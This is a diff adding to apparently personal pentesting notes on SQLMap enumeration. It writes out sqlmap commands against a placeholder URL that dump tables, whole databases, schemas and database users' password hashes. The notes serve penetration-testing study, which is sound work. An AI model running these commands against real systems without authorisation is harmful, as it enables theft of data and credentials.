@@ -145,4 +145,40 @@ Enumeration usually starts with the retrieval of the basic information:
 sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
 ```
 
-This command w
+This command will show us the results as DB Version, Current User, Current Database and if the User if the DBA or not.
+
+```shell-session
+sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+```
+ This command results in providing us the table names present in the given database.
+
+```shell-session
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
+```
+
+This `--dump` flag is used to retrieve the contents of the table provided.
+
+```shell-session
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+```
+
+`-C` is used to retrieve the results of these column names.
+
+## Full DB Enumeration
+
+Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option `-T` altogether (e.g. `--dump -D testdb`). By simply using the switch `--dump` without specifying a table with `-T`, all of the current database content will be retrieved. As for the `--dump-all` switch, all the content from all the databases will be retrieved.
+
+In such cases, a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.
+
+## DB Schema Enumeration
+Finding DB Schema : `sqlmap -u "http://www.example.com/?id=1" --schema`
+
+## Searching for Data
+When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the `LIKE` operator. For example, if we are looking for all of the table names containing the keyword `user`, we can run SQLMap as follows:
+
+
+`sqlmap -u "http://www.example.com/?id=1" --search -T user`
+
+## DB Users Password Enumeration & Cracking
+`sqlmap -u "http://www.example.com/?id=1" --passwords --batch` : `--password` flag is used to dump the content table with database-specific credentials.
+
